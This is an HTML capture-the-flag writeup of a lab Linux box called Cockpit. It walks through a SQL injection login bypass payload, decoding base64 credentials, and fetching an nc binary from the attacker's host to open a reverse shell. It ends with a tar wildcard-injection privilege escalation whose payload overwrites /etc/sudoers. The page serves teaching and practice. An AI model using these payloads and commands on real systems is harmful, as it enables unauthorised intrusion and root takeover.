@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cockpit &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Cockpit</h1>
+    <div class="meta">Target: <code>192.168.176.10</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">Gobuster</span><span class="tag">FeroxBuster</span><span class="tag">SQLi</span><span class="tag">LoginBypass</span><span class="tag">Base64</span><span class="tag">CockpitUI</span><span class="tag">RestrictedShell</span><span class="tag">tar</span><span class="tag">GTFOBins</span><span class="tag">WildcardInjection</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#nmap">Nmap</a><a class="lvl3" href="#web-enumeration-on-port-80">Web Enumeration on Port 80</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#sql-injection-auth-bypass">SQL Injection, Auth Bypass</a><a class="lvl3" href="#cockpit-web-terminal">Cockpit Web Terminal</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#tar-wildcard-injection">tar Wildcard Injection</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Cockpit is a Linux box running an Apache web server on port 80 and Ubuntu's Cockpit management interface on port 9090. The HTTP landing page looks static, but FeroxBuster finds <code>login.php</code>, a SQL-injectable login form. Bypassing it dumps a password dashboard containing base64-encoded credentials. Those credentials log into the Cockpit web terminal as <code>james</code>. The Cockpit shell runs a restricted <code>nc</code> that cannot execute commands, but downloading a full <code>nc</code> binary bypasses that. <code>james</code> has a sudo rule for a specific <code>tar</code> command with a wildcard, enabling a classic tar wildcard injection that overwrites <code>/etc/sudoers</code> and grants unrestricted root access.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http    Apache httpd
+9090/tcp open  zeus-admin
+</code></pre>
+<h3 id="web-enumeration-on-port-80">Web Enumeration on Port 80</h3>
+<p>Gobuster finds standard CSS/JS directories but nothing exploitable:</p>
+<pre><code class="language-sh">gobuster dir -u http://192.168.176.10/ -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt
+/css   (Status: 301)
+/img   (Status: 301)
+/js    (Status: 301)
+</code></pre>
+<p>FeroxBuster goes deeper and finds the login page:</p>
+<pre><code class="language-sh">200 GET  28l  63w  769c http://192.168.176.10/login.php
+</code></pre>
+<p>The page footer reveals a hostname for <code>/etc/hosts</code>: <code>blaze.offsec</code>. After adding it and reloading, the page identifies as a "blaze" login portal.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="sql-injection-auth-bypass">SQL Injection, Auth Bypass</h3>
+<p>Default credentials fail. Entering a single quote <code>'</code> in the username field returns:</p>
+<pre><code class="language-sql">Error: You have an error in your SQL syntax; check the manual that corresponds
+to your MySQL server version for the right syntax to use near '%' AND password
+like '%%'' at line 1
+</code></pre>
+<p>MySQL is running the query with <code>LIKE</code> comparisons, and the error leaks the query structure. Using a standard MySQL auth bypass payload:</p>
+<pre><code class="language-sql">'OR '' = '
+</code></pre>
+<blockquote>
+<p><strong>Why this bypass works:</strong> the injected <code>OR '' = ''</code> creates a condition that is always true, short-circuiting the password check. MySQL evaluates the full WHERE clause as true for every row, so the query returns the first user in the table regardless of the password provided.</p>
+</blockquote>
+<p>The bypass opens the admin dashboard at <code>/password-dashboard.php</code>, which displays stored credentials:</p>
+<pre><code>Username   Password
+james      Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=
+cameron    dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy
+</code></pre>
+<p>Both passwords are base64-encoded (not hashed):</p>
+<pre><code class="language-sh">echo 'Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=' | base64 -d
+‹redacted›
+
+echo 'dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy' | base64 -d
+‹redacted›
+</code></pre>
+<p>Giving credentials:</p>
+<pre><code>james : ‹redacted›
+cameron : ‹redacted›
+</code></pre>
+<h3 id="cockpit-web-terminal">Cockpit Web Terminal</h3>
+<p>Port 9090 is Ubuntu Cockpit, a browser-based server management interface. <code>james</code>'s credentials authenticate successfully. Cockpit provides a web terminal running as <code>james</code>.</p>
+<p>The installed <code>nc</code> binary is restricted:</p>
+<pre><code class="language-sh">james@blaze:~$ nc -e
+nc: invalid option -- 'e'
+</code></pre>
+<p>No <code>-e</code> flag means no direct reverse shell. But <code>wget</code> is unrestricted, so a full-featured <code>nc</code> binary can be pulled from Kali:</p>
+<pre><code class="language-sh">james@blaze:~$ wget http://192.168.45.244/nc
+james@blaze:~$ chmod +x nc
+james@blaze:~$ ./nc 192.168.45.244 9090 -e /bin/bash
+</code></pre>
+<pre><code class="language-sh">nc -lvnp 9090
+connect to [192.168.45.244] from (UNKNOWN) [192.168.176.10] 52258
+
+whoami
+james
+</code></pre>
+<p>Shell upgrade:</p>
+<pre><code class="language-sh">script /dev/null -c /bin/bash
+james@blaze:~$
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="tar-wildcard-injection">tar Wildcard Injection</h3>
+<p><code>sudo -l</code> shows a constrained but exploitable rule:</p>
+<pre><code class="language-sh">User james may run the following commands on blaze:
+    (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
+</code></pre>
+<p>The trailing <code>*</code> is the vulnerability. When <code>tar</code> expands a wildcard, it treats filenames as command arguments. GTFOBins documents the technique:</p>
+<blockquote>
+<p><strong>How tar wildcard injection works:</strong> <code>tar</code> processes each file in the current directory as an argument. If a filename looks like a <code>tar</code> option (e.g., <code>--checkpoint-action=exec=cmd</code>), <code>tar</code> interprets it as a flag rather than a filename. By creating specially named files, an attacker injects arbitrary tar options into the command the admin intended to run, causing code execution without touching the tar binary itself.</p>
+</blockquote>
+<p>Create the injection files in <code>/tmp</code>:</p>
+<pre><code class="language-sh">echo &quot;&quot; &gt; '--checkpoint=1'
+echo &quot;&quot; &gt; '--checkpoint-action=exec=sh payload.sh'
+</code></pre>
+<p>Create <code>payload.sh</code> on Kali and transfer it via wget:</p>
+<pre><code class="language-sh"># payload.sh contents:
+echo 'james ALL=(root) NOPASSWD: ALL' &gt; /etc/sudoers
+</code></pre>
+<pre><code class="language-sh">wget http://192.168.45.244/payload.sh
+chmod +x payload.sh
+</code></pre>
+<p>Run the sudo tar command from <code>/tmp</code>:</p>
+<pre><code class="language-sh">sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
+</code></pre>
+<p><code>tar</code> hits the checkpoint file, executes <code>payload.sh</code>, and overwrites <code>/etc/sudoers</code>. Confirming:</p>
+<pre><code class="language-sh">james@blaze:/tmp$ sudo -l
+User james may run the following commands on blaze:
+    (root) NOPASSWD: ALL
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">james@blaze:/tmp$ sudo /bin/bash
+root@blaze:/tmp# whoami
+root
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>SQL error messages are free reconnaissance.</strong> The leaked query structure told exactly which bypass to use without any fuzzing.</li>
+<li><strong>Base64 is encoding, not encryption.</strong> Credentials stored as base64 in a database are effectively plaintext, one command to decode.</li>
+<li><strong>Cockpit's web terminal is a real shell.</strong> Browser-based management UIs are high-value targets; gaining credentials to one is functionally equivalent to SSH access.</li>
+<li><strong>Wildcard injection in sudo commands is a reliable privesc.</strong> Any sudo rule with a trailing <code>*</code> in a user-writable directory is exploitable via specially crafted filenames, regardless of what command is being run.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
